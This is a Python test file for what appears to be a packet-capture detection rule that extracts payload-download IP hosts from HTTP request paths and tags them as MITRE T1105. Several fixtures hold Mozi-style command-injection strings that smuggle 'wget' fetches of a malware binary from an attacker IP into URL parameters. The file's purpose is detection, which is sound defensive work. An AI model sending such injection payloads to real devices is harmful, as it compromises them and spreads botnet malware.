from spectre.core.base import NormEvent
from spectre.modules.pcap.normalize import extract_payload_hosts
from spectre.modules.pcap.rules import payload_host


def test_extract_payload_hosts_finds_ip_urls():
    text = "GET /setup.cgi?next=wget+http://110.39.249.68:45221/Mozi.a HTTP/1.1"
    assert extract_payload_hosts(text) == ["110.39.249.68"]


def test_extract_payload_hosts_dedups_and_orders():
    text = "http://1.1.1.1/a http://2.2.2.2/b http://1.1.1.1/c"
    assert extract_payload_hosts(text) == ["1.1.1.1", "2.2.2.2"]


def test_extract_payload_hosts_ignores_domain_urls():
    assert extract_payload_hosts("http://example.com/x") == []


def test_extract_payload_hosts_rejects_ip_prefixed_domain():
    assert extract_payload_hosts("wget http://1.2.3.4.attacker.com/foo") == []


def test_extract_payload_hosts_rejects_invalid_octets():
    assert extract_payload_hosts("http://999.999.999.999/x") == []


def _http(path, src_ip="20.22.31.98", host="203.161.44.208", payload=""):
    return NormEvent(
        artifact_type="pcap_http", timestamp="t0", source_file="ev.pcap",
        record_id="c0", host=host,
        data={"src_ip": src_ip, "dst_ip": host, "direction": "inbound",
              "http_request_path": path, "ascii_payload": payload,
              "raw": path},
    )


def test_payload_host_rule_emits_t1105():
    e = _http("/x?cmd=wget+http://110.39.249.68:45221/Mozi.a")
    anchor = payload_host(e)
    assert anchor is not None
    assert anchor.rule_id == "pcap-payload-host"
    assert anchor.mitre == ["T1105"]
    assert anchor.iocs["ip"] == ["110.39.249.68"]


def test_payload_host_filters_monitored_host():
    e = _http("/x?u=http://203.161.44.208/ecp")   # payload host == monitored
    assert payload_host(e) is None


def test_payload_host_emits_when_payload_equals_scanner():
    # Mozi self-hosts its payload: the scanner IP is also the payload host.
    e = _http("/shell?cmd=wget+http://110.39.249.68:45221/Mozi.a", src_ip="110.39.249.68")
    anchor = payload_host(e)
    assert anchor is not None
    assert anchor.iocs["ip"] == ["110.39.249.68"]
    assert anchor.mitre == ["T1105"]


def test_payload_host_filters_loopback():
    e = _http("/x?u=http://127.0.0.1/p")
    assert payload_host(e) is None


def test_payload_host_filters_multicast():
    e = _http("/x?u=http://239.255.255.250/p")
    assert payload_host(e) is None


def test_payload_host_returns_second_when_first_filtered():
    # first URL host is the monitored host (filtered); second is a real payload host
    e = _http("/x?a=http://203.161.44.208/ecp&b=http://110.39.249.68/Mozi.a")
    anchor = payload_host(e)
    assert anchor is not None
    assert anchor.iocs["ip"] == ["110.39.249.68"]
